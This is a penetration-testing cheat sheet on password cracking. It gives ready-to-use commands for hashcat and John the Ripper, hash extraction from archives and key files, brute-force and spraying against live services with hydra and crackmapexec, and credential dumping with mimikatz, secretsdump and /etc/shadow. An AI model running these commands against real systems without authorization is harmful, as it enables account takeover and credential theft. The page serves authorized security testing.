:::writing
---
title: Password Cracking 
description: Comprehensive password cracking techniques, tools, and commands for penetration testing engagements.
navigation:
  icon: i-lucide-lock-keyhole
---

## Overview

Password cracking is a critical phase in penetration testing used to recover plaintext credentials from hashes, encrypted files, or authentication mechanisms. It involves **offline attacks** (against captured hashes) and **online attacks** (against live services).

> Always ensure you have **proper authorization** before performing any password cracking activities.

## Hash Identification

Before cracking, identify the hash type to choose the correct attack mode.

### Using hash-identifier

::code-preview
---
class: "[&>div]:*:my-0"
---
Identify hash type interactively.

#code
```bash
hash-identifier
```
::

### Using hashid

::code-preview
---
class: "[&>div]:*:my-0"
---
Identify hash type from command line.

#code
```bash
hashid '<hash-value>'
```
::

### Using Name-That-Hash

::code-preview
---
class: "[&>div]:*:my-0"
---
Modern hash identification tool.

#code
```bash
nth --text '<hash-value>'
```
::

### Common Hash Formats

| Hash Type         | Example                                      | Length  |
| ----------------- | -------------------------------------------- | ------- |
| MD5               | `5d41402abc4b2a76b9719d911017c592`           | 32 chars |
| SHA1              | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d`   | 40 chars |
| SHA256            | `2cf24dba5fb0a30e26e83b2ac5b9e29e...`        | 64 chars |
| SHA512            | `cf83e1357eefb8bdf1542850d66d8007...`        | 128 chars |
| NTLM              | `32ed87bdb5fdc5e9cba88547376818d4`           | 32 chars |
| bcrypt            | `$2a$10$...`                                 | 60 chars |
| Linux Shadow MD5  | `$1$salt$hash`                               | Variable |
| Linux Shadow SHA512 | `$6$salt$hash`                             | Variable |

## Offline Cracking with Hashcat

Hashcat is the fastest GPU-based password cracking tool.

### Dictionary Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Crack hashes using a wordlist.

#code
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
::

### Common Hashcat Modes

| Mode   | Hash Type                |
| ------ | ------------------------ |
| `0`    | MD5                      |
| `100`  | SHA1                     |
| `1400` | SHA256                   |
| `1700` | SHA512                   |
| `1000` | NTLM                    |
| `1800` | Linux SHA512 (shadow)    |
| `3200` | bcrypt                   |
| `500`  | MD5 Unix ($1$)           |
| `5600` | NetNTLMv2               |
| `13100`| Kerberoasting TGS-REP   |
| `18200`| AS-REP Roasting          |
| `7500` | Kerberos 5 TGS-REP RC4  |
| `22000`| WPA-PBKDF2-PMKID+EAPOL  |

### Brute Force Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Brute force all 8-character lowercase passwords.

#code
```bash
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l
```
::

### Hashcat Charsets

| Charset | Description             |
| ------- | ----------------------- |
| `?l`    | Lowercase (a-z)         |
| `?u`    | Uppercase (A-Z)         |
| `?d`    | Digits (0-9)            |
| `?s`    | Special characters      |
| `?a`    | All characters          |
| `?b`    | Binary (0x00-0xff)      |

### Rule-Based Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Apply rules to mutate wordlist entries.

#code
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
::

### Common Rule Files

| Rule File              | Description                         |
| ---------------------- | ----------------------------------- |
| `best64.rule`          | Most effective 64 rules             |
| `rockyou-30000.rule`   | Large rule set                      |
| `d3ad0ne.rule`         | Comprehensive mutations             |
| `toggles1.rule`        | Toggle case variations              |
| `OneRuleToRuleThemAll` | Community-driven comprehensive rule |

### Combination Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Combine two wordlists.

#code
```bash
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```
::

### Show Cracked Results

::code-preview
---
class: "[&>div]:*:my-0"
---
Display previously cracked hashes.

#code
```bash
hashcat -m 0 hashes.txt --show
```
::

## Offline Cracking with John the Ripper

John the Ripper is a versatile CPU-based cracking tool with broad format support.

### Dictionary Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Crack hashes using a wordlist.

#code
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
::

### Specifying Hash Format

::code-preview
---
class: "[&>div]:*:my-0"
---
Specify hash format explicitly.

#code
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
::

### Common John Formats

| Format           | Hash Type              |
| ---------------- | ---------------------- |
| `raw-md5`        | MD5                    |
| `raw-sha1`       | SHA1                   |
| `raw-sha256`     | SHA256                 |
| `raw-sha512`     | SHA512                 |
| `nt`             | NTLM                   |
| `sha512crypt`    | Linux SHA512 ($6$)     |
| `bcrypt`         | bcrypt                 |
| `krb5tgs`        | Kerberoasting          |
| `krb5asrep`      | AS-REP Roasting        |

### Rule-Based Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Apply mangling rules.

#code
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hashes.txt
```
::

### Show Cracked Passwords

::code-preview
---
class: "[&>div]:*:my-0"
---
Display cracked passwords.

#code
```bash
john --show hashes.txt
```
::

### Incremental (Brute Force) Mode

::code-preview
---
class: "[&>div]:*:my-0"
---
Pure brute force attack.

#code
```bash
john --incremental hashes.txt
```
::

## Extracting Hashes for Cracking

Extract hashes from various file types using John's helper utilities.

### Linux Shadow File

::code-preview
---
class: "[&>div]:*:my-0"
---
Combine passwd and shadow for cracking.

#code
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
::

### ZIP Files

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack ZIP password.

#code
```bash
zip2john protected.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```
::

### RAR Files

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack RAR password.

#code
```bash
rar2john protected.rar > rar_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt
```
::

### SSH Private Keys

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack SSH key passphrase.

#code
```bash
ssh2john id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```
::

### PDF Files

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack PDF password.

#code
```bash
pdf2john protected.pdf > pdf_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
```
::

### KeePass Databases

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack KeePass master password.

#code
```bash
keepass2john database.kdbx > keepass_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
```
::

### Microsoft Office Documents

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack Office document password.

#code
```bash
office2john protected.docx > office_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt office_hash.txt
```
::

### 7-Zip Archives

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack 7z password.

#code
```bash
7z2john protected.7z > 7z_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt 7z_hash.txt
```
::

## Online Brute Force Attacks

Attack live services directly using credential stuffing or brute forcing.

### Hydra

::code-preview
---
class: "[&>div]:*:my-0"
---
Brute force SSH login.

#code
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```
::

### Hydra Common Protocols

| Protocol   | Command Example                                                            |
| ---------- | -------------------------------------------------------------------------- |
| SSH        | `hydra -l user -P pass.txt ssh://<ip>`                                     |
| FTP        | `hydra -l user -P pass.txt ftp://<ip>`                                     |
| HTTP GET   | `hydra -l user -P pass.txt <ip> http-get /admin`                          |
| HTTP POST  | `hydra -l user -P pass.txt <ip> http-post-form "/login:user=^USER^&pass=^PASS^:F=fail"` |
| RDP        | `hydra -l admin -P pass.txt rdp://<ip>`                                   |
| SMB        | `hydra -l admin -P pass.txt smb://<ip>`                                   |
| MySQL      | `hydra -l root -P pass.txt mysql://<ip>`                                  |
| MSSQL      | `hydra -l sa -P pass.txt mssql://<ip>`                                    |
| Telnet     | `hydra -l admin -P pass.txt telnet://<ip>`                                |
| SMTP       | `hydra -l user@domain.com -P pass.txt smtp://<ip>`                        |
| POP3       | `hydra -l user -P pass.txt pop3://<ip>`                                   |

### Medusa

::code-preview
---
class: "[&>div]:*:my-0"
---
Brute force using Medusa.

#code
```bash
medusa -h <target-ip> -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
```
::

### Ncrack

::code-preview
---
class: "[&>div]:*:my-0"
---
Brute force using Ncrack.

#code
```bash
ncrack -p 22 --user admin -P /usr/share/wordlists/rockyou.txt <target-ip>
```
::

### CrackMapExec (SMB)

::code-preview
---
class: "[&>div]:*:my-0"
---
Password spraying SMB.

#code
```bash
crackmapexec smb <target-ip> -u users.txt -p passwords.txt
```
::

## Wordlist Generation

Create custom wordlists tailored to the target.

### CeWL (Custom Word List Generator)

::code-preview
---
class: "[&>div]:*:my-0"
---
Generate wordlist from target website.

#code
```bash
cewl https://target.com -d 3 -m 5 -w custom_wordlist.txt
```
::

### Crunch

::code-preview
---
class: "[&>div]:*:my-0"
---
Generate wordlist with specific pattern.

#code
```bash
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```
::

### CUPP (Common User Passwords Profiler)

::code-preview
---
class: "[&>div]:*:my-0"
---
Generate target-specific wordlist interactively.

#code
```bash
cupp -i
```
::

### Mentalist

::code-preview
---
class: "[&>div]:*:my-0"
---
GUI-based wordlist generator.

#code
```bash
mentalist
```
::

### Username Wordlists

::code-preview
---
class: "[&>div]:*:my-0"
---
Generate username variations from a name.

#code
```bash
# Using username-anarchy
username-anarchy "John Smith" > usernames.txt
```
::

## Common Wordlists

| Wordlist                                | Location                                              |
| --------------------------------------- | ----------------------------------------------------- |
| RockYou                                 | `/usr/share/wordlists/rockyou.txt`                    |
| SecLists Passwords                      | `/usr/share/seclists/Passwords/`                      |
| SecLists Usernames                      | `/usr/share/seclists/Usernames/`                      |
| Darkweb Top 1000                        | `/usr/share/seclists/Passwords/darkweb2017-top1000.txt` |
| Common Credentials                      | `/usr/share/seclists/Passwords/Common-Credentials/`   |
| Default Credentials                     | `/usr/share/seclists/Passwords/Default-Credentials/`  |

## Windows Credential Extraction

### Dumping SAM Database

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract NTLM hashes from Windows.

#code
```bash
# Using secretsdump (Impacket)
secretsdump.py <domain>/<user>:<password>@<target-ip>

# Using mimikatz
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
```
::

### Extracting NTDS.dit (Domain Controller)

::code-preview
---
class: "[&>div]:*:my-0"
---
Dump Active Directory hashes.

#code
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
::

## Linux Credential Extraction

### Shadow File

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract Linux password hashes.

#code
```bash
cat /etc/shadow

# Combine for cracking
unshadow /etc/passwd /etc/shadow > combined.txt
```
::

## Rainbow Table Attacks

Pre-computed hash lookups for instant cracking.

### Using RainbowCrack

::code-preview
---
class: "[&>div]:*:my-0"
---
Crack using rainbow tables.

#code
```bash
rcrack /path/to/rainbow/tables -h <hash-value>
```
::

### Online Rainbow Table Services

| Service              | URL                              |
| -------------------- | -------------------------------- |
| CrackStation         | `https://crackstation.net`       |
| Hashes.org           | `https://hashes.org`             |
| OnlineHashCrack      | `https://www.onlinehashcrack.com`|
| HashKiller           | `https://hashkiller.io`          |

## Password Spraying

Try a single password against many accounts to avoid lockouts.

::code-preview
---
class: "[&>div]:*:my-0"
---
Password spray using CrackMapExec.

#code
```bash
crackmapexec smb <target-ip> -u users.txt -p 'Password123!'
```
::

::code-preview
---
class: "[&>div]:*:my-0"
---
Spray against Kerberos.

#code
```bash
kerbrute passwordspray -d domain.local users.txt 'Password123!'
```
::

## Useful Tips

- **Start with dictionary attacks** before attempting brute force — they are faster and more efficient.
- **Use rules** to mutate wordlists for better coverage without generating massive files.
- **GPU cracking** with Hashcat is significantly faster than CPU-based cracking with John.
- **Custom wordlists** based on OSINT improve success rates dramatically.
- **Password spraying** avoids account lockout policies by limiting attempts per account.
- **Always check online databases** like CrackStation before running lengthy offline attacks.

## References

- [Hashcat Wiki](https://hashcat.net/wiki/)
- [John the Ripper Documentation](https://www.openwall.com/john/doc/)
- [HackTricks - Brute Force](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)
- [SecLists Repository](https://github.com/danielmiessler/SecLists)
- [PayloadsAllTheThings - Password Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP Testing Guide - Authentication](https://owasp.org/www-project-web-security-testing-guide/)

::tip
Always document your findings and ensure all password cracking activities are within the **scope of your engagement** and authorized by the client.
::
:::